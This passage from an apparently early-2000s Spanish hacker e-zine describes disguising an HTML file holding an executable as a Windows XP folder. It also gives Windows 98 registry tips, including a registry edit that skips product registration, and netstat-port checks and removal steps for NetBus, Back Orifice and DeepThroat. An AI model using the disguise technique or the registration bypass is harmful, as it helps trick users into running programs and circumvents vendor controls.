"Self-Executing HTML: Internet Explorer 5.5 and 6.0 Part IV" 
un artículo en el que demostraba cómo, creando un archivo .html 
cuyo código apunta hacia un ejecutable contenido en el 
propio archivo .html, es posible hacer correr un ejecutable 
(.exe) cuando la víctima abre el archivo con el Internet Explorer.

La novedad es que, ellos mismos, acaban de publicar, bajo el 
asunto "Self-Executing FOLDERS: Windows XP Explorer Part V" un 
texto en el que se advierte de que el mismo archivo, renombrado 
con la extensión .folder, tomará el icono de una carpeta, pero 
al ser abierto, se ejecutará mediante el Internet Explorer, causando 
el resultado buscado, es decir, ejecutar un .exe desde lo que 
parece ser una carpeta. 

En realidad, no existe ningún hallazgo entre el primer articulo 
y el segundo.
En ambos casos el archivo debe ser ejecutado localmente, bajo la 
zona de seguridad "Mi PC", es decir, no puede ser utilizado desde 
internet.
La extensión .folder está documentada y es nueva en Windows XP.
El hecho de que a pesar de la extensión, el archivo sea abierto
por el Internet Explorer, es normal, y se debe a que el Explorer 
trata de encontrar la aplicación adecuada para abrir el archivo 
comparando el principio del código del archivo con una lista 
predeterminada, por lo tanto al encontrar que el código es html,
es el Internet Explorer el que se encarga de abrirlo. 

De todos modos, para los que estén preocupados por esto, podemos 
reconocer una carpeta maliciosa porque siempre debe llevar la 
extensión .folder, desconfía si te mandan una carpeta con esta 
extensión. 
Para ésto debes tener configurado tu XP para que se vean todas 
las extensiones, es decir: 
Herramientas 
	>> Opciones de carpeta 
		>> Ver 
			>> Desmarcar "Ocultar extensiones de archivo para tipos de archivo conocidos"

	 


***********************
-----------------------
TRUCOS WIN 98
-----------------------
                    E.I
***********************



En windows 98 existe una utilidad denominada "Windows Update" 
se encuentra en el menú de inicio y sirve para que puedas 
actualizar tu sistema con los ultimos drivers, parches, etc.

Para que puedas hacer esto sin que estes registrado, ahi van 
los cambios para el registro del sistema.

REGEDIT4
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion]
"RegDone"="1"
"[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Welcome\RegWiz]
"@"="1"


*Como crear un evento de sonido.

Utilizando el Editor de Registro podremos crear un evento en 
el sistema y asociarle un sonido.

Ejecutamos la aplicacion "Regedit.exe" desde Inicio/Ejecutar.
Entramos en la clave HKEY_CURRENT_USER/AppEvents/Schemes/Apps
Suponiendo que vamos a crear un evento con Word poniendole un 
sonido al Iniciarse.

Seleccionar la clave Apps, pulsamos con el boton derecho sobre 
la misma, escogiendo a continuacion Nueva Clave, a esta clave 
le daremos el nombre de Winword. Que es el nombre del ejecutable 
pero sin extension ni path.
Despues nos iremos al panel derecho y pulsaremos con el boton 
derecho sobre la clave predeterminado, poniendo el nombre 
descriptivo que nos parezca "Word".
Situaremos el cursor Winword y pulsaremos boton derecho del 
raton para añadir una nueva clave, a esta clave hay que darle 
el nombre de uno de los eventos del sistema, que se encuentran 
en la carpeta Default que esta un poco mas arriba. 
Le daremos el nombre de Open.


Hecho esto iremos a sonidos en el panel de control y asignaremos 
al evento creado el sonido que mas nos guste.
A partir de ahora cuando entremos en Word oiremos el sonido.



*Pon Iconos a tus disquetes.

Si quieres poner algun el icono que desees a tus disquetes, haz 
lo siguiente:

Copia tu icono en el disco a: ej:mi_icono.ico
Crea un fichero llamado Autorun.inf y escribe en el las siguientes 
lineas.
[autorun]
icon=mi_icono.ico


Abre con el editor de registro "Regedit" la rama suiguiente
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer

Pon aqui el valor de NoDriveTypeAutoRun=91 00 00 00
A partir del nuevo arranque ya tendras un icono diferente en cada 
disco personalizado.


*Autopreviewing

Cuando en una ventana pasamos el cursor por ficheros AVI, WAV, 
estos nos deben aparecer en la parte inferior izquierda de la 
ventana una "preview" del fichero y asi poder ejecutar la música 
o el vídeo. 
Esta funcionalidad, se la he denominado "autopreviewing", la cual
ha sido deshabilitada en la versión final.

Para volverla a habilitar hay que abrir un fichero llamado FOLDER.HTT 
que esta en la carpeta c:\windows\web y modifar un linea.

Quitarle el atributo de oculto ejecutando la siguiente orden:
- attrib c:\windows\web\folder.htt -h

Editarlo (con edit o notepad) y buscar la frase:
- var wantmedia = false
y cambiarla por
- var wantmedia = true

Volver a poner el atributo de oculto con:
- attrib c:\windows\web\folder.htt +h


*Salir de Windows con un Acceso directo

Para salir de Windows crea un acceso directo con la siguiente 
línea de comandos:

C:\WINDOWS\RUNDLL32.EXE user.exe,ExitWindows



*Como hacer que el ordenador se apague por si solo.

Para poder hacer este truco debes tener una placa y una fuente de 
alimentacion un poco especiales, de las que no tienes que darle a 
ningun boton cuando sale el mersaje "Ahora puedes apagar".

Entrar en Inicio/Programas/Accesorios/Herramientas del sistema/Tareas Programadas
Agragar tarea programada, pulsa Siguiente, Examinar y pon como 
nombre de archivo esta linea
C:\WINDOWS\RUNDLL32.EXE user.exe,ExitWindows
Una vez creada la tarea, ir a propiedades a la solapa de programas 
y en la ventana "Programar Tarea" elegir la opcion -Cuando este Inactivo-.
Poner el tiempo que tardará en ejecutarse la tarea.
Transcurrido este tiempo de inactividad el ordenador se apagara solo.


*Mira tu configuracion TCP/IP sobre Internet, DNS, Proxy, etc.

Para poder ver todo esto solo tienes que ejecutar teclear desde el 
menu inicio la aplicacion "winipcfg".





Acelera tu acceso a Internet.

Todos hemos oido hablar de esos famosos paquetes (shareware o freeware), 
que aceleran la conexión a Internet. Al menos eso dicen.
Aceleran, dependiendo de quien o como sea nuestro proveedor de 
Internet.
 Me explico. El tamaño ideal del paquete IP, es aquel en el que el 
cliente y el servicio están sincronizados. Nuestro servidor, cuando 
estamos en Internet, es nuestro proveerdor de servicios. 
Si nuestro proveedor tiene una maquina Unix, probablemente, su tamaño 
de paquete sea "pequeño" (del orden de 500 bytes). 
En cambio si nuestro proveedor tiene un NT, su paquete será "grande" 
(del orden de 4 Kbs).
Bién esos famosos paquetes, lo unico que hacen es tocar el registro
de Windows (y a veces "destrozan" mas de lo que hacen), el parametro 
de la MTU y asociados, para intentar ajustar el tamaño de paquete.
No lo suelen hacer mal, excepto en el caso de que ademas de conectarnos 
via modem, tengamos una red interna mediante tarjeta de red y utilicemos 
tambien en nuestra red el TCP/IP. En este caso nos pueden hacer destrozos.

Windows 98 nos da facilidades para manejar esto, sin necesidad de 
acudir a estos "bastante peligrosos" paquetes.

Windows 98 incluye la posibilidad de modificar el tamaño del paquete. 
Para esto en Panel de Control->Red->Adaptador de acceso telefonico,
en "Avanzado", tenemos el parametro "Tamaño del paquete IP", y podemos 
seleccionar los tres valores de: pequeño, mediano y grande. 
Solo nos queda probar. Y ademas tenemos la garantia de que esto 
afectará unicamente a nuestra conexion telefonica, y no a nuestra
posible red TCP.


*Como detectar el virus NetBus en nuestro sistema.

Para comprobar si tienes instalado el servidor de NetBus en tu 
sistema, emplea el "NETSTAT" :

NETSTAT -an

Si te responde algo como "12345", será la prueba de que esta instalado.
Para eliminarlo:
Borraremos el programa servidor que por defecto es "patch.exe" aunque 
puede tomar cualquier nombre.
Ejecutamos Regedit.exe y entramos en la clave 
"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Una vez encontrado el ejecutable lo ejecutaremos con el parametro "/remove".
Reiniciar el sistema.



*Como detectar el virus Back Orifice en nuestro sistema.

Para comprobar si tienes instalado el BO en tu sistema, emplea el 
"NETSTAT" para verificar las conexiones UDP abiertas, ejecuta la orden siguiente:

NETSTAT -an

Si te responde algo como "0,0,0,0:31337 *.*, será la prueba de que 
tienes instalado el servidor de Back Orifice en tu ordenador.
El ejecutable de BO mide 124.928 bytes, al ser ejecutado se borra 
de forma automatica y crea una copia de si mismo en el subdirectorio
windows\system como *.exe y un archivo windll.dll de 8.192 bytes, 
depues se mete en el registro del sistema para ejecutarse cada vez 
que se inicia Windows.
Para eliminarlo:
Borraremos el *.exe y el windll.dll.
Ejecutamos Regedit.exe y entramos en la clave 
"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Currentversion\Runservices
Se eliminara la referencia existente al *.exe
Reiniciar el sistema.



*Como detectar el virus DeepThroat.

Para comprobar si tienes instalado el servidor de DeepThroat en 
tu sistema, emplea el "NETSTAT", crea un fichero de nombre "sytempatch.exe" :

NETSTAT -an

Si los puertos "2140" o "3150" son listados podemos tener la 
certeza de que tenemos el servidor.
Para eliminarlo:
1- Ejecutamos Regedit.exe y entramos en la clave.

"HKEY_LOCAL_MACHINE\Sofware\Windows\CurrentVersion\Run

2- Buscamos y borrar la clave SystemDLL32 con el valor 
systempatch.exe, es la ruta completa la servidor.

3- Localizar el programa marcado por la ruta y borrarlo.

4- Reiniciar el sistema.


*Como redirigir Windows.

Como ya habras visto cuando guarda, inicias , etc, Windows siempre 
te lleva a unas carpetas determinadas, como:

C:\Mis documentos
C:\WINDOWS\Menz Inicio\Programas
C:\WINDOWS\SendTo
C:\WINDOWS\Menz Inicio
C:\WINDOWS\Favoritos
C:\WINDOWS\Temporary Internet Files\
etc.
Si quieres modificar estos caminos para que tus ficheros se guarden 
en sitio diferente, hazlo en la clave del registro:

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders


*Como restaurar copias de registros de Windows antiguos.

Windows 98 hace cada dia una copia del registro del sistema, esto 
lo utiliza por si hubiera un fallo del registro.

En este caso Windows se limita a poner la copia creada mas reciente. 
También podemos hacer una copia cuando queramos, utilizando el 
programa SCANREGW.EXE el cual nos explorara el registro en busca de fallos.

Si queremos restaurar una copia mas antigua, lo haremos así:

Arrancar el sistema dejando pulsada la tecla CONTROL.
Una vez que salga el menu de de inicio, elegir la opción n:5.
Escribir desde el símbolo de sistema la orden
scanreg /restore

Esto visualizara una lista en donde te dejara elegir que copia 
deseas restaurar. 
Selecciona una y pulsa retorno.
Recuerda que todos los cambios realizados desde esa fecha los perderás.


**********
----------
DESPEDIDA 
----------
     SudHack
**********

Bueno, agradezo que hallas llegado hasta aca
(capaz no llegaste y leiste esto solo :S)
Espero, que sepas apreciar, lo "poco" que ayudamos en el
mundo underground, ya que esta comunidad todavia esta en "pañales"
falta mucho por crecer, y nos falta mucho para dar.
Nuevamente pido perdon por el retraso de la e-zine
pero como ya dije, no queria bajar el nivel de la misma.

Recuerda que si tenes alguna duda nos podes escribir y que si 
queres colaborar con la e-zine, en los textos o en lo que quieras
puedes escribirnos, estariamos muy contentos de que lo hagas :D

Bueno, vasta de despedidas
ME PONEN MELANCÓLICO :'(

Nos vemos.......
HASTA EL PROXIMO NÚMERO!!!!!!!!!!!!!!     




